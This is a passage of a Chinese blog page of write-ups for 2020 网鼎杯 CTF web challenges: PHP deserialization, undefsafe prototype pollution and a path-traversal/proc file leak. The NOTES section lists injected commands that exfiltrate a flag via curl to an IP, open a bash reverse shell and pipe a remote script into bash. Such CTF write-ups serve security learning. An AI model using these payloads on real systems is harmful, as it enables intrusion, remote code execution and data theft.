@@ -1,0 +1,527 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>网鼎杯做题记录 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/4.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="网鼎杯做题记录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-01 12:46" pubdate>
+        2021年9月1日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      35
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">网鼎杯做题记录</h1>
+            
+            <div class="markdown-body">
+              <h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>题目直接给了源码，</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;read();<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(is_valid(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = unserialize(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>逻辑比较简单，分析一下就是用<code>op</code>的值控制是读还是写的操作，这里直接想到的是读flag.php，这里有两个点要绕过。第一个就是</p>
+<p><code>is_valid</code>函数限制序列化<code>protected</code>时产生的0x00，还有一个是<code>__destruct() </code>函数判断<code>op===2</code>使op为1是写入操作，同时让content为空字符，这样就写了个寂寞。</p>
+<h4 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h4><p>利用php&gt;7.1版本时对于<code>public</code> <code>protected</code>并不敏感，序列化时可直接用<code>public</code>，让<code>op</code>等于数字2，强弱类型比较不解释了。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> FileHandler();<br><span class="hljs-variable">$demo</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$demo</span>;<br><span class="hljs-comment">#输出&lt;/code&gt;[Result]: &lt;br&gt;&lt;?php $flag=&#x27;flag&#123;ce554f72-394d-480a-94e4-f42e3362042b&#125;&#x27;;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>将<code>protected</code>序列化出来的s变成S，ascii空字符改成十六进制\00即可</p>
+<p>看了看wp，似乎buu这个环境和当时比赛时也不一样，当时还需要读路径，因为<code>apache</code>配置下destruct函数在执行时就不在本目录了，这个可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/fwkjdaghappy1/article/details/7631475%EF%BC%8C%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%AF%B9%E4%B8%8D%E5%87%BA%E6%9D%A5flag%EF%BC%8C%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AF%BB%E5%8F%96%EF%BC%8C/proc/self/cmdline%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">https://blog.csdn.net/fwkjdaghappy1/article/details/7631475，用相对路径对不出来flag，想要获取绝对路径，可以通过读取，/proc/self/cmdline，然后可以知道配置文件路径</a> /web/config/httpd.conf。</p>
+<h1 id="NOTES"><a href="#NOTES" class="headerlink" title="NOTES"></a>NOTES</h1><p>审计源码<code>edit_not</code>路由存在写入操作</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">app.route(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> id = req.body.id;<br>        <span class="hljs-keyword">let</span> author = req.body.author;<br>        <span class="hljs-keyword">let</span> enote = req.body.raw;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.edit_note(id, author, enote);<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br></code></pre></div></td></tr></table></figure>
+
+<p>写入操作用的是undersafe，存在原型链污染，再往下看发现执行命令的地方</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">edit_note</span>(<span class="hljs-params">id, author, raw</span>)</span> &#123;<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>执行系统命令在输出，这里将污染commands字典来执行命令</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">app.route(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            exec(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.send(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.end();<br>    &#125;)<br><br></code></pre></div></td></tr></table></figure>
+
+<p>令command多了一个键值对 author:系统命令，遍历时自动执行<br>/edit_note post传参 id=<em>proto</em>.bb&amp;author=curl -F ‘flag=@/flag’ 174.1.84.222:2333&amp;raw=a<br>或者：id=_proto_，author=bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1，raw=123<br>id=<em>proto</em>.abc&amp;author=curl%20ip:port/shell.txt|bash&amp;raw=a<br>id=<em>proto</em>&amp;author=cat /flag&gt;/dev/tcp/xxxxx/7777&amp;raw=123</p>
+<p>这里需要用buu小号重开一个Linux Labs反弹，因为buu只能反弹shell到内网。</p>
+<h1 id="PicDown"><a href="#PicDown" class="headerlink" title="PicDown"></a>PicDown</h1><p>打开界面看了一下get参数有<code>url</code>简单试了下就出来了<code>../../../../../../../../../flag</code>。。肯定不是预期解，看一下预期解。</p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>又考了下关于进程信息的东西。参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792">https://blog.csdn.net/shenhuxi_yu/article/details/79697792</a></p>
+<p>在/proc 文件系统中，每一个进程都有一个相应的文件 。下面是/proc 目录下的一些重要文件 ：</p>
+<p>/proc/pid/cmdline 包含了用于开始进程的命令 ；</p>
+<p>/proc/pid/cwd 包含了当前进程工作目录的一个链接 ；</p>
+<p>/proc/pid/environ 包含了可用进程环境变量的列表 ；</p>
+<p>/proc/pid/exe 包含了正在进程中运行的程序链接；</p>
+<p>/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；</p>
+<p>/proc/pid/mem 包含了进程在内存中的内容；</p>
+<p>/proc/pid/stat 包含了进程的状态信息；</p>
+<p>/proc/pid/statm 包含了进程的内存使用信息。</p>
+<p>PID一列代表了各进程的进程ID,也就是说,PID就是各进程的身份标识。<code>/proc/self</code>表示当前进程目录</p>
+<p>这里用到了<code>/proc/self/cmdline</code>读取当前进程执行命令，用python2执行了app.py脚本，读取一下源码</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)<br>SECRET_KEY = f.read().strip()<br>os.remove(SECRET_FILE)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/page&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page</span>():</span><br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            res = urllib.urlopen(url)<br>            value = res.read()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">manager</span>():</span><br>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.system(shell)<br>        res = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></div></td></tr></table></figure>
+
+<p>只过滤了url参数开头不能用file协议，怪不得有非预期。在后面可以看到<code>no_one_know_the_manager</code>中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了，这里就用到了<code>/proc/pid/fd/</code>读取，这个目录包含了进程打开的每一个文件的链接。爆破出secret在<code>/proc/pid/fd/3</code></p>
